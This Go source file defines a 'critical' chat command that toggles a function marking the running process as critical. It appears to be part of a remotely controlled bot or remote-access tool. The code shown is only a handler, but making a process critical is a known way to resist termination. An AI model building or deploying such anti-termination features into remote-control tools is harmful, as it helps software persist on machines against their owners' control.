package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
)

func (*CriticalCommand) Exec(ctx *store.CommandContext, args []string) {
	content := strings.Join(args, " ")

	set := false
	var err error

	if utils.HasFlag(content, "on") {
		set, err = funcs.SetCritical(true)
	} else if utils.HasFlag(content, "off") {
		set, err = funcs.SetCritical(false)
	} else {
		ctx.ReplyMsg("🟥 Invalid flag.")
		return
	}

	if set {
		ctx.ReplyMsg("🟩 Successfully set as critical.")
	} else {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to set as critical - %s", err))
	}
}

func (*CriticalCommand) Name() string {
	return "critical"
}

func (*CriticalCommand) Info() string {
	return "Makes this a critical process."
}

type CriticalCommand struct{}
